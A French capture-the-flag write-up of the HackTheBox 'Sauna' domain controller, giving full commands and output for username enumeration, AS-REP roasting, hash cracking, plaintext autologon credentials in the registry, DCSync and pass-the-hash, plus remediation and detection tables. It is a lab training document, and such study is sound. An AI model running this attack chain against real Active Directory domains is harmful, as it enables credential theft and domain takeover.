# Sauna — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows Server (contrôleur de domaine) |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-09-30 |
| **Vecteur** | Énum. users (site web + kerbrute) → **AS-REP roast** `fsmith` → creds **autologon** (registre) `svc_loanmgr` → **DCSync** → hash Administrator → PtH |
| **CVE** | aucune — abus de configuration Active Directory |
| **Tags** | active-directory · username-enum · as-rep-roast · autologon · dcsync |

> `<IP_CIBLE>` = IP de session. tun0 = `10.10.14.x` · cible = `10.129.x.x`.
> ⚙️ Mets le domaine dans `/etc/hosts` dès que tu le connais.

> 🎯 **Phase 4 — 2e box AD, consolidation.** Même colonne vertébrale que Forest
> (**AS-REP roast → … → DCSync**), mais deux nouveautés à travailler :
> 1) **construire une liste d'utilisateurs** quand la session nulle ne les donne pas (à partir du **site web**),
> 2) trouver des **identifiants d'autologon** planqués dans le **registre**.

---

## TL;DR

Le site web (Egotistical Bank, IIS) expose des **noms d'employés** → je reconstruis une liste de logins
(`username-anarchy`) et je valide avec **kerbrute** : `fsmith` existe **et** n'a pas de pré-auth Kerberos.
**AS-REP roast** → hash → `hashcat -m 18200` → mot de passe `Thestrokes23`. Connexion Evil-WinRM (user).
En privesc, la clé de registre **Winlogon** contient des identifiants d'**autologon en clair** :
`svc_loanmgr` / `Moneymakestheworldgoround!`. Ce compte de service détient les **droits de réplication**
(`GetChangesAll`) → **DCSync** direct → hash Administrator → **Pass-the-Hash**.

**Énum users (web+kerbrute) → AS-REP roast (`fsmith`) → autologon (`svc_loanmgr`) → DCSync → hash Administrator → PtH → DC compromis.**

---

## 1. Reconnaissance

```bash
┌──(kali㉿kali)-[~/Téléchargements]
└─$ nmap -sC -sV -oA suane <IP_CIBLE>                                           
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-30 08:11 +0200
Nmap scan report for <IP_CIBLE>
Host is up (0.023s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-30 13:11:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-30T13:11:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.38 seconds

```

| Port | Service | Ce que ça signale |
| --- | --- | --- |
| 53 | DNS | contrôleur de domaine |
| 80 | HTTP (IIS) | site « Egotistical Bank » → **source de noms d'employés** |
| 88 | Kerberos | authentification AD |
| 135/139/445 | RPC/SMB | énumération |
| 389/636/3268 | LDAP/LDAPS/GC | annuaire |
| 5985 | WinRM | accès distant une fois les creds en main |

- Domaine / hostname : **`EGOTISTICAL-BANK.LOCAL`** / **`SAUNA`** (Windows Server 2019, Build 17763).
- ⚠️ Skew d'horloge de **7h** (`clock-skew: 7h00m00s`) → Kerberos y est sensible ; si un ticket échoue, `sudo ntpdate <IP_CIBLE>` ou `faketime` pour aligner l'heure.

---

## 2. Énumération — construire une liste d'utilisateurs

Ici la session nulle ne crache pas forcément les comptes. **Autre source : le site web** (page « Meet the team » / « About »). Les **noms d'employés** + une **convention de nommage** = ta liste.

```bash
# 1) Récupère les noms sur le site (http://<IP_CIBLE>)
# 2) Génère les variantes de logins (prénom, p.nom, prenom.nom, nomP...) :
#    outil : username-anarchy
./username-anarchy -i noms.txt > users.txt
┌──(kali㉿kali)-[~/kerbrute]
└─$ ./dist/kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc <IP_CIBLE> ../user.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 09/30/26 - Ronnie Flathers @ropnop

2026/09/30 08:50:26 >  Using KDC(s):
2026/09/30 08:50:26 >   <IP_CIBLE>:88

2026/09/30 08:50:26 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:0e7e0292e783a97c65efd3ef11ff1740$48db61a9ef9f0c4a3b9df928efcef708103ff7217c279959b3b4216b507031661be59c4863fd12db04c23afb5539956c2434e61a72ca71e7ff424513964877bf3fbc758c129f2cb9b47b7d758f9163f1cecf359c94bbe7a28d1cba983a2fbb4dbb379acabdeb3084a76cb4d056742c44b36e784b5472e5d24f65a492ed96e58f6f25e5f23e14f3e09379ba74d8d0a0fde286b6928292ca0f99792ec5d500b6e11671f3ae5ee768cb2549571d87ba04bfe449e20fc87fbc71ac4942df1efeeb94a2cc4ae83194778834a76f9bc72345bcf6387851822698798b51138d3601b8943190c31266e167a645678a2dcac11a466821a15dcb0ff7cfb62b898539de027e00138bf5b3531cfcb3852c74983d466594cfeb5632f1                                                               
2026/09/30 08:50:26 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2026/09/30 08:50:26 >  Done! Tested 116 usernames (1 valid) in 0.292 seconds

```

- Convention de nommage déduite : `premiere lèttre prénom nom attaché`
- Utilisateur(s) valides : `fsmith`

> Réflexe méthodo : quand l'énum anonyme est muette, **l'OSINT léger** (le site de la cible) reconstruit la liste. C'est réaliste : les organigrammes fuient les identifiants.

---

## 3. Accès initial (foothold) — AS-REP Roasting

Même principe que Forest (compte sans pré-auth → hash cassable hors ligne).
```bash
┌──(kali㉿kali)-[~]
└─$ impacket-GetNPUsers 10.129.95.180/ -no-pass -usersfile user.txt -format hashcat -outputfile asrep.txt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
[-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
```

> ⚠️ **Piège rencontré — `KDC_ERR_WRONG_REALM`.** J'avais passé l'**IP** comme realm
> (`impacket-GetNPUsers 10.129.95.180/`). Kerberos veut le **nom du domaine**, pas l'IP :
> `impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile user.txt ... -dc-ip <IP>`.
> Contournement utilisé ici : **netexec/ldap `--asreproast`**, qui interroge directement le DC.

```bash
┌──(kali㉿kali)-[~]
└─$ netexec ldap <IP_CIBLE> -u fsmith@EGOTISTICAL-BANK.LOCAL -p '' --asreproast out.asreproast
LDAP        <IP_CIBLE>   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert) 
LDAP        <IP_CIBLE>   389    SAUNA            $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL@EGOTISTICAL-BANK.LOCAL:fc93e928b1ea46ffda32091445eac93f$a0b315c804ada2b81d7bf7178fb964ebe6ee22d7ec61c98637bb297b7217ff789fa0920b4a07d217c55643569ae2d890a7faf544e38d0d9b019ab7ba49040dc4a264d88d2e0a28b6c2bdf0a7eb09fff57144b8a645a37a57a86426f0b1167a736607258320729bd62cfadf9b3549786cd81ea6137b283ce2237d996ce369cd22aca128c574a5e9c3af699b75835b7ca3abd88ce3566e93eb70da808f01a893b60819c683d5bc92939afde92aef17d5c1b606b4df9d2eda9ba5587df69ffe82e47cb50c0df02cc320d4335cbe2fb15b9104f02df9c62427527df7b1adc7465643d4c0dedfe0dc30dc81f564aa2bf944c8abfc3e0b6fde86531c2609c3b670fc64  


┌──(kali㉿kali)-[~]
└─$ hashcat -m 18200 out.asreproast /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 7.1+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 21.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 9 5900HX with Radeon Graphics, 2829/5659 MB (2829 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (7330 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL@EGOTISTICAL-BANK.LOCAL:fc93e928b1ea46ffda32091445eac93f$a0b315c804ada2b81d7bf7178fb964ebe6ee22d7ec61c98637bb297b7217ff789fa0920b4a07d217c55643569ae2d890a7faf544e38d0d9b019ab7ba49040dc4a264d88d2e0a28b6c2bdf0a7eb09fff57144b8a645a37a57a86426f0b1167a736607258320729bd62cfadf9b3549786cd81ea6137b283ce2237d996ce369cd22aca128c574a5e9c3af699b75835b7ca3abd88ce3566e93eb70da808f01a893b60819c683d5bc92939afde92aef17d5c1b606b4df9d2eda9ba5587df69ffe82e47cb50c0df02cc320d4335cbe2fb15b9104f02df9c62427527df7b1adc7465643d4c0dedfe0dc30dc81f564aa2bf944c8abfc3e0b6fde86531c2609c3b670fc64:Thestrokes23
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL@EGOTIST...70fc64
Time.Started.....: Wed Sep 30 09:08:36 2026 (9 secs)
Time.Estimated...: Wed Sep 30 09:08:45 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1192.1 kH/s (2.46ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10543104/14344385 (73.50%)
Rejected.........: 0/10543104 (0.00%)
Restore.Point....: 10536960/14344385 (73.46%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: Tiffany95 -> Teague51
Hardware.Mon.#01.: Util: 55%

Started: Wed Sep 30 09:08:35 2026
Stopped: Wed Sep 30 09:08:47 2026


```

- Compte vulnérable : `fsmith`
- Mot de passe cassé : `Thestrokes23`
- Connexion : `evil-winrm -i <IP_CIBLE> -u fsmith -p 'Thestrokes23'`

**Flag user :** desktop utilisateur (non publié).

---

## 4. Énumération privesc — les identifiants d'autologon

Déroule `lire-peas` (Windows). Ici la piste **n°2 (identifiants qui traînent)** paie :

```powershell
# winPEAS → section "AutoLogon" / "Looking for AutoLogon credentials"
# ou à la main dans le registre :
*Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x8c9319f7
    ShutdownFlags    REG_DWORD    0x8000022b
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey

```

- Compte + mot de passe autologon trouvés : `svc_loanmanager` / `Moneymakestheworldgoround!`

> **AutoLogon** stocke le mot de passe **en clair** dans le registre (`DefaultUserName`/`DefaultPassword`)
> pour ouvrir une session automatiquement. C'est un classique — pense à cette clé sur toute box Windows.
>
> ⚠️ **Piège du nom de compte** : le registre affiche `svc_loanmanager`, mais le **vrai `sAMAccountName`**
> (celui qui s'authentifie) est **`svc_loanmgr`**. Si le login échoue avec le nom du registre, vérifie le
> nom réel du compte (`nxc smb <IP> -u fsmith -p '...' --users`, ou l'objet dans BloodHound).

---

## 5. Élévation de privilèges — DCSync

Le compte d'autologon (un compte de service) a souvent des **droits de réplication**. Confirme dans
**BloodHound** (`GetChanges` / `GetChangesAll` sur le domaine), puis DCSync direct — **pas besoin de
créer un pion cette fois** si le compte a déjà le droit.

```bash
# vérifier le droit dans BloodHound (Mark as Owned → Shortest path to DA)
# puis DCSync :
┌──(kali㉿kali)-[~/Téléchargements]
└─$ impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.110.81 -just-dc-user Administrator
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
[*] Cleaning up... 

# Pass-the-Hash
evil-winrm -i <IP_CIBLE> -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

- Droit abusé : **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** (= DCSync), portés directement par `svc_loanmgr` (visible dans BloodHound : arête `GetChangesAll` → domaine).
- Pourquoi ça marche : ces droits sont ceux qu'un **DC** utilise pour se synchroniser avec ses pairs. `svc_loanmgr` les possède → je peux **demander au DC de me répliquer les secrets** (les hashes NTLM, dont l'Administrateur) **comme si j'étais un DC**. Ensuite le **Pass-the-Hash** me connecte avec le hash NT sans connaître le mot de passe.
- Différence avec Forest : ici le compte a **déjà** le droit DCSync → **pas besoin de créer un pion ni de faire un `dacledit`**. Chaîne plus courte.

**Flag root :** `C:\Users\Administrator\Desktop\root.txt` (non publié).

---

## 6. Remédiation

- Pré-authentification Kerberos activée partout ; mots de passe de service longs (gMSA).
- **Pas d'AutoLogon** avec mot de passe en clair dans le registre.
- Restreindre les droits de réplication (`DS-Replication-Get-Changes*`) aux seuls DC.
- Ne pas exposer d'organigramme/emails facilitant l'énumération.

---

## 7. Côté Blue Team — détection

| Étape | Trace / Event | Détection |
| --- | --- | --- |
| Username enum (kerbrute) | **4768/4771** en rafale (comptes testés) | pic d'échecs Kerberos |
| AS-REP roast | 4768 sans pré-auth, RC4 | règle Sigma AS-REP |
| Lecture registre autologon | accès `Winlogon` | EDR / audit registre |
| DCSync | **4662** réplication depuis un non-DC | la détection reine AD |

---

## 8. Leçons

- **Énumération d'users par OSINT** : quand la session nulle est muette, le **site web** (noms d'employés) + `username-anarchy` + `kerbrute` reconstruisent la liste. Réaliste : les organigrammes/emails fuient les identifiants.
- **AutoLogon** : réflexe à ajouter à ma checklist Windows — clé registre `Winlogon`, mot de passe en clair (`DefaultPassword`).
- **DCSync direct vs chaîne d'ACL** : Forest exigeait de construire l'accès (Account Operators → EWP → WriteDacl → DCSync). Ici `svc_loanmgr` **porte déjà** le droit → DCSync immédiat. Même attaque finale, chemin plus court.
- **Piège realm Kerberos** : passer le **nom de domaine**, pas l'IP, sinon `KDC_ERR_WRONG_REALM`.
- **Piège nom de compte** : `svc_loanmanager` (registre) ≠ `svc_loanmgr` (sAMAccountName réel).
- **Skew d'horloge** : Kerberos refuse un ticket si l'écart d'heure est trop grand → aligner l'horloge (`ntpdate`/`faketime`).
- Consolidé pour l'oral : la chaîne **AS-REP → DCSync** est maintenant un réflexe, vue sous deux formes (Forest = ACL, Sauna = droit direct).

---

## Références

- Fiches liées : [nmap](../outils/nmap.md) · [smb](../outils/smb.md) · [ad-attacks](../outils/ad-attacks.md) · [bloodhound](../outils/bloodhound.md) · [impacket](../outils/impacket.md) · [hashcat](../outils/hashcat.md) · [lire-peas](../outils/lire-peas.md)
